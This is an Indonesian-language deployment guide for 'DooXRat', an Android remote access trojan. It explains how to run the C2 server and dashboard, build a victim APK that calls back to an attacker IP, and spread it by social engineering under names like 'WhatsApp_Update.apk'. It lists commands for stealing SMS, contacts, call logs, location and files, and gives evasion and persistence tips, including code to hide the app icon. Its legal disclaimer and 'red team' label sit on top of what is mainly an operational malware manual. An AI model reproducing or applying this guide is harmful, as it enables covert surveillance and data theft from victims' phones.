# DooXRat Deployment Guide

## Quick Start (3 Steps)

### Step 1: Start C2 Server

```bash
cd backend
npm install
node server.js
```

Server akan jalan di `http://0.0.0.0:5000`

Login default:
- Username: `admin`
- Password: `DooXRat2026!`

### Step 2: Start Dashboard

```bash
cd dashboard
npm install
npm start
```

Dashboard buka di browser: `http://localhost:3000`

### Step 3: Build APK Victim

**PENTING:** Edit `victim-app/lib/services/rat_service.dart` baris 11:
```dart
static const String SERVER_URL = 'http://YOUR_SERVER_IP:5000';
```

Ganti `YOUR_SERVER_IP` dengan IP server lo (bisa cek pake `ip addr show`)

Build APK:
```bash
cd victim-app
flutter pub get
flutter build apk --release
```

APK ada di: `victim-app/build/app/outputs/flutter-apk/app-release.apk`

## Transfer APK ke Target

### Method 1: USB
```bash
adb install app-release.apk
```

### Method 2: HTTP Server
```bash
cd victim-app/build/app/outputs/flutter-apk/
python3 -m http.server 8080
```

Victim download dari: `http://YOUR_IP:8080/app-release.apk`

### Method 3: Social Engineering
- Rename APK jadi nama menarik: `WhatsApp_Update.apk`, `TikTok_Premium.apk`
- Upload ke file hosting (Google Drive, Mega, MediaFire)
- Kirim link ke target via WhatsApp/Telegram

## Post-Installation

1. Victim install APK
2. APK auto minta permissions (SMS, Contacts, Location, etc)
3. Victim grant semua permission
4. APK connect ke C2 server
5. Dashboard munculin victim baru
6. Klik "Control" buat akses full device

## Commands You Can Execute

| Command | Action |
|---------|--------|
| **SMS** | Baca semua SMS inbox/sent |
| **Contacts** | Ambil semua kontak |
| **Call Logs** | History panggilan masuk/keluar |
| **Location** | GPS coordinates real-time |
| **Apps** | List semua app terinstall |
| **Files** | Browse file system |
| **Send SMS** | Kirim SMS dari device victim |
| **Vibrate** | Trigger vibration (test command) |

## Production Tips

### Obfuscate APK
```bash
# Edit android/app/build.gradle
buildTypes {
    release {
        minifyEnabled true
        shrinkResources true
        proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
    }
}
```

### Change Package Name
Edit `android/app/build.gradle`:
```gradle
defaultConfig {
    applicationId "com.random.name123"  // ganti ini
}
```

Edit `AndroidManifest.xml`:
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.random.name123">  <!-- ganti ini -->
```

### Change App Name
Edit `AndroidManifest.xml`:
```xml
<application
    android:label="WhatsApp Update"  <!-- ganti ini -->
```

### Hide Icon After Install
Tambah di `MainActivity.kt`:
```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    hideIcon()
}

private fun hideIcon() {
    val pm = packageManager
    pm.setComponentEnabledSetting(
        ComponentName(this, MainActivity::class.java),
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP
    )
}
```

## Security Hardening

### Backend
- Ganti password admin di `.env`
- Add JWT authentication
- Rate limit API endpoints
- Gunakan HTTPS (add SSL cert)

### Network
```bash
# Firewall rules
ufw allow 5000/tcp
ufw allow 3000/tcp

# Nginx reverse proxy
server {
    listen 443 ssl;
    server_name your-domain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://localhost:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
    }
}
```

### Persistence APK
APK udah punya:
- Boot receiver (auto start pas device reboot)
- Service restart on destroy
- Foreground service (susah di-kill)

## Troubleshooting

### APK Nggak Connect
- Cek SERVER_URL udah bener
- Cek firewall server allow port 5000
- Cek victim punya internet
- Cek server running

### Permission Denied
- Install manual (jangan via ADB)
- Victim harus grant manual di settings
- Android 11+ butuh special permission via settings

### Build Error
```bash
flutter doctor
flutter clean
flutter pub get
flutter build apk
```

## Legal Warning

**HANYA UNTUK TESTING DI DEVICE SENDIRI ATAU DENGAN IZIN TERTULIS.**

Unauthorized access = ILLEGAL (UU ITE Pasal 30, bisa 10 tahun penjara).

Penulis tidak bertanggung jawab atas penyalahgunaan tool ini.

---

**DooXRat** © 2026 - Red Team Research Tool
